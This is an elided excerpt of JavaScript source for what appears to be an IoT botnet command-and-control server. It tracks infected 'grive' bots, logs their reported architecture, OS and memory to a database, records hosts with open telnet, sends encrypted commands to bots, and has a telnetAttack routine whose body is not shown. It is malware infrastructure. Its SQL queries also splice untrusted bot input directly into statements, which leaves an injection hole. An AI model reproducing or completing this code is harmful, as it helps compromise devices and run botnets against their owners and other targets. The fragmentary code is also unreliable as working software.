...
function readsokcet (socket) {
 // it is triggered whenvere the there is data sent through the socket
    socket.on('data', function(data) {
        ...
        let mess = buf.toString('utf8', 0, len);
        Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
            fs.writeFile(`/home/logFile/${element.id}_log.txt`, mess+'\n', { flag: 'a+' }, err => {
                if (err) throw err;
              });
        })
...
// setting the bot architecture
        if(mess.includes('Arch: ')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
            var info = mess.split(':');
                   sqlcon.query(`UPDATE GRIVE_INFO set ARCH = '${info[1].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                       /// console.log(`[IoT_Bots] action: setting_info the grive |${element.id}| architecture, status:${result.affectedRows}`);
                        d = new Date().toISOString();
          ...
          if(mess.includes('OS')){
            Bot_sock.forEach(element =>{
              if (socket.remoteAddress == element.ip)
              var info = mess.split(':');
                     sqlcon.query(`UPDATE GRIVE_INFO set OS = '${info[1].trim()}' where ID = ${element.id};`, (err, result)=>{
                         if (err) throw err;
                        //  console.log(`[IoT_Bots] action: setting_info the grive |${element.id}| operating_system, status:${result.affectedRows}`);
                          d = new Date().toISOString();
       ...
       // setting the bot distribution
        if(mess.includes('ID=')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
            var info = mess.split('=');
                   sqlcon.query(`UPDATE GRIVE_INFO set Distribution = '${info[1].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                       // console.log(`[IoT_Bots] action: setting_info the grive |${element.id}| distribution, status:${result.affectedRows}`);
                        d = new Date().toISOString();
        ...
        if(mess.includes('MemTotal')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
            var info = mess.split(':');
                   sqlcon.query(`UPDATE GRIVE_INFO set Total_RAM = '${info[1].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                       // console.log(`[IoT_Bots] action: setting_info the grive |${element.id}| Total RAM, status:${result.affectedRows}`);
                        d = new Date().toISOString();
          ...
          if(mess.includes('MemFree')){
            Bot_sock.forEach(element =>{
              if (socket.remoteAddress == element.ip)
              var info = mess.split(':');
                     sqlcon.query(`UPDATE GRIVE_INFO set Free_RAM = '${info[1].trim()}' where ID = ${element.id};`, (err, result)=>{
                         if (err) throw err;
                          //console.log(`[IoT_Bots] action: setting_info the grive |${element.id}| Free RAM, status:${result.affectedRows}`);
                          d = new Date().toISOString();
        ...
        if(mess.includes('OPEN')){
               address = mess.substring(12, 27);
               open_telnet.push(address);
               console.log(`[IoT] IoT: ${address}, status: OPEN TELNET.`);
               d = new Date().toISOString();
               fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${address} status: OPEN TELNET.\n`, { flag: 'a+' }, err => {
               if (err) throw err;
               });
        }
...
function send_msg( conn, msg){
    ...
    // need to add a space after the msg.lenght
       conn.write("0"+encry_length.toString()+ encrypted_msg); 
        //console.log(`[C&C] action: Sending message to grive${conn.remoteAddress}, status: 1.`);
        d = new Date().toISOString();
...
async function telnetAttack(ip){
  ...
  var attackagain= function() {
   ...
   // console.log('the lock is released');
...
server.on('connection', (conn)=>{
  ...
  conn.on("close", (err)=>{
    if (err) throw err;
    //console.log(`The grive ${conn.remoteAddress}:${conn.remotePort} is disconnected`);
    Bot_sock.forEach(b=>{
          ...
          //Bot_sock.forEach(element=> console.log(element.id));
  });
          ...
          result.forEach(element => {
            ...
            Bot_sock.forEach(grive => {
              if(grive.id == element.id)
                tmp_socket = grive.socket; 
                send_msg(tmp_socket, '05');
                            });
                                    })
               }
        })
